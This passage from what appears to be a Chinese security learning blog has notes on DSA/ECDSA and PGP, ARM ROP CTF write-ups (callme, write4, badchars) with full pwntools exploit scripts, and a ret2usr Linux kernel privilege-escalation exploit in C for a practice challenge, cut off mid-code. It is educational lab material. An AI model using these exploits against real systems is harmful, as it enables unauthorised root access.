q,\delta&#x3D;(x+a\gamma’)k^{-1}\mod q\<br>\alpha^x\beta^{\gamma’}\equiv\gamma^\delta\mod p\<br>\gamma&#x3D;(\alpha^x\beta^{\gamma’})^{\delta^{-1}\mod q}\mod p\Rightarrow \gamma&#x3D;<br>(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma’\delta^{-1}\mod q}\mod p)\mod q&#x3D;\gamma’$$<br>验证$\gamma&#x3D;<br>(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma’\delta^{-1}\mod q}\mod p)\mod q&#x3D;\gamma’$是否成立。成立则数字签名有效。</p><p>$$sig_K(x,k)&#x3D;(\gamma, \delta), \gamma&#x3D;(\alpha^k\mod p)\mod q,\delta&#x3D;(\operatorname {SHA-1}(x)+a\gamma)k^{-1}\mod q\<br>e_1&#x3D;\operatorname {SHA-1}(x)\delta^{-1}\mod q,e_2&#x3D;\gamma\delta^{-1}\mod q\<br>ver_K(x,(\gamma,\delta))&#x3D;true\Leftrightarrow(\alpha^{e_1}\beta^{e_2}\mod p)\mod q&#x3D;\gamma$$</p><h3 id="椭圆曲线数字签名"><a href="#椭圆曲线数字签名" class="headerlink" title="椭圆曲线数字签名"></a>椭圆曲线数字签名</h3><p>p是一个大素数，E定义在F<del>p</del>上的椭圆曲线。设A是E上阶为q（素数）的一个点，使得在&lt;A&gt;上的离散对数问题是难处理的。设P&#x3D;{0,1}*，A&#x3D;Z<del>q</del>*×Z<del>q</del>*，定义K&#x3D;{(p,q,E,A,m,B): B&#x3D;mA}<br>其中0≤m≤q-1，值p,q,E,A,B为公钥，m为私钥。<br>对于K和一个秘密的随机数k，1≤k≤q-1，定义<br>$$sig_K(x,k)&#x3D;(r,s)$$<br>其中</p><h2 id="PGP安全协议"><a href="#PGP安全协议" class="headerlink" title="PGP安全协议"></a>PGP安全协议</h2><p>一种以用户为中心的可提供机密性和鉴别的安全协议。<br><img src="https://img-blog.csdnimg.cn/a98b1c862cd94c579ebe7801e9819470.jpeg"><br>若需要签名和加密，则先签名再加密，如需压缩则加密后压缩：$Z(Sig(H(M),kR_a)||M)$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM pwn 入门 (4)</title>
      <link href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/"/>
      <url>/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/</url>
      
        <content type="html"><![CDATA[<h1 id="3-callme"><a href="#3-callme" class="headerlink" title="3. callme"></a><font face=汉仪唐美人>3. callme</font></h1><p><font face=汉仪唐美人>本题有多个文件，根据题意来看是需要依次调用<code>callme_one</code>、<code>callme_two</code>、<code>callme_three</code>这3个库函数。这三个函数会进行flag的解密，但是需要满足前三个参数等于特定值。这就需要我们去elf文件中寻找合适的gadget了。</font></p><p><img src="https://img-blog.csdnimg.cn/f794d1d4548f4bbabf06a989ec5a3896.png"></p><p><font face=汉仪唐美人>而本题正好给出了一个不能再合适的gadget，因为本题的考点就在这里：</font></p><p><img src="https://img-blog.csdnimg.cn/2eba76ed63c542939bb5c78f86863d56.png"></p><p><font face=汉仪唐美人>因此思路就很简单了，直接重复调用这个gadget修改前3个寄存器的值，再分别调用三个callme函数即可。</font></p><p><font face=汉仪唐美人>这里需要注意的是，elf文件中虽然给出了一个可以调用3个库函数的函数，能够填充got表，但由于ROP只能写入已知地址，如果写入的是got表的地址，那么程序就会将got表地址当做指令地址来执行，这显然是不对的，少了一层解引用。因此我们需要使用plt表进行利用。和x86架构下的利用相同，如果要使用plt表进行利用，需要注意返回地址的设置。<font color=red>如果plt地址卸载栈上地址值为a的地方，ROP到此，返回地址应该为a-8，且返回后SP指向a+8处</font>。因此，我们需要在<code>callme_one</code>函数的plt地址前面写下一个ROP导向地址。</font></p><p><font face=汉仪唐美人>因此我们可以直接在这里写<code>useful_gadget</code>的地址，在<code>callme_one</code>后面直接写三个参数，然后再调用下一个库函数，以此类推。</font></p><p><font face=汉仪唐美人>exp：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-arm-static&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;-g&#x27;, &#x27;9999&#x27;, &#x27;./callme_armv5&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./callme_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">useful_gadget = <span class="number">0x10870</span></span><br><span class="line">pop_out = <span class="number">0x108dc</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(useful_gadget)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(pop_out) + p32(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/49ca344a36e745089c4ee59d2a51d6c9.png"></p><h1 id="4-write4"><a href="#4-write4" class="headerlink" title="4. write4"></a><font face=汉仪唐美人>4. write4</font></h1><p><font face=汉仪唐美人>本题的pwnme和print_file函数都写在了库函数中，但观察elf文件可以发现有两个gadget：</font></p><p><img src="https://img-blog.csdnimg.cn/af54c37e7cb64d6c8d89abb02b614809.png"></p><p><font face=汉仪唐美人>其中第一个为任一地址写指令，第二个可以用作ROP的gadget。考虑到print_file函数需要传入一个字符串参数作为打开的文件，我们需要将flag.txt写到一个特定的地方，然后使用第二个gadget即可传参。</font></p><p><img src="https://img-blog.csdnimg.cn/8d2afe1c39484468ae0d98b38de0b8ff.png"></p><p><font face=汉仪唐美人>和x86的本题不同，这里的bss段太小，无法写入，因此尝试写入到data段。</font></p><p><img src="https://img-blog.csdnimg.cn/b6727b5af7594cc2bb8da256d8ebcadb.png"></p><p><font face=汉仪唐美人>exp：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./write4_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line">write_gadget = <span class="number">0x105ec</span></span><br><span class="line">pop_r0pc = <span class="number">0x105f4</span></span><br><span class="line">pop_r3r4pc = <span class="number">0x105f0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r3r4pc) + <span class="string">b&#x27;flag&#x27;</span> + p32(write_addr)</span><br><span class="line">payload += p32(write_gadget) + <span class="string">b&#x27;.txt&#x27;</span> + p32(write_addr + <span class="number">4</span>);</span><br><span class="line">payload += p32(write_gadget) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(pop_r0pc) + p32(write_addr) + p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d65b16df2426438cac5d0091f66d4cc7.png"></p><h1 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5. badchars"></a><font face=汉仪唐美人>5. badchars</font></h1><p><font face=汉仪唐美人>本题的pwnme中栈溢出过滤了4个字符：x、g、a、.，因此需要利用elf中的gadget。我们看一下都有什么gadget。</font></p><p><img src="https://img-blog.csdnimg.cn/3396d40910794657b163d7afe0983a96.png"></p><p><font face=汉仪唐美人>第一段gadget：[R5]&#x3D;[R5]-R6; 赋值R0</font><br><font face=汉仪唐美人>第二段gadget：[R5]&#x3D;[R5]+R6; 赋值R0</font><br><font face=汉仪唐美人>第三段gadget：[R4]&#x3D;R3; 赋值R5和R6</font><br><font face=汉仪唐美人>第四段gadget：[R5]&#x3D;[R5]^R6; 赋值R0</font></p><p><font face=汉仪唐美人>看到了异或操作，我们可以利用这个异或操作在数据区构造出来关键字符。这里的加法、减法和异或操作实际上只需要一个就可以了。我们将字符串写在和上一道题相同的位置。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./badchars_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x105f0</span>, <span class="number">0x10600</span>, <span class="number">0x10610</span>, <span class="number">0x10618</span>]</span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line"></span><br><span class="line">payload = p32(write_addr + <span class="number">12</span>) * (<span class="number">0x2c</span> // <span class="number">4</span>)<span class="comment"># 这里要写一个有效地址，不然STR R3, [R4]会报错</span></span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + <span class="string">b&#x27;fl&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="number">0xFF</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>) ^ <span class="number">0xFF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">1</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + p32(<span class="number">0xFFFF0000</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;.&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="number">0xFF</span>) + <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr + <span class="number">4</span>) + p32(<span class="number">0xFF00FF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(write_addr)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa202fbd09d9472fb65bbfc4893ffb58.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 入门 (2)</title>
      <link href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/"/>
      <url>/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h1><p>在上一篇文章中，我们借助一道kernel pwn的入门题——core完成了kernel ROP的学习，本系列按照<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core-1">与上一篇文章相同的资料</a>的顺序继续学习与复现。本篇文章学习的漏洞技术为：ret2usr</p><p>仍然使用上一篇文章的例题，没有开启SMAP&#x2F;SMEP，有从内核直接执行用户空间代码的可能性。我们已经知道在本题中能够很容易地获取到两个关键函数的地址，我们在用户态写一个调用提权函数的代码片段，但是不在用户态执行，而是将其插入到ROP链中由内核来执行，与上一题的效果是相同的。只需要对上一题的代码进行一些部分修改即可。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;<span class="comment">// address of to key function</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds_base = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;<span class="comment">// file pointer of process &#x27;core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">// including all address of kernel functions</span></span><br><span class="line"><span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line"><span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line"><span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">commit_creds = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;</span><br><span class="line">prepare_kernel_cred = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line"><span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line"><span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">index += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">// define two function pointer</span></span><br><span class="line"><span class="type">void</span>* (*prepare_kernel_credp)(<span class="type">void</span>*) = prepare_kernel_cred;</span><br><span class="line"><span class="type">int</span> (*commit_credsp)(<span class="type">void</span>*) = commit_creds;</span><br><span class="line">commit_credsp(prepare_kernel_credp(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getuid())&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span 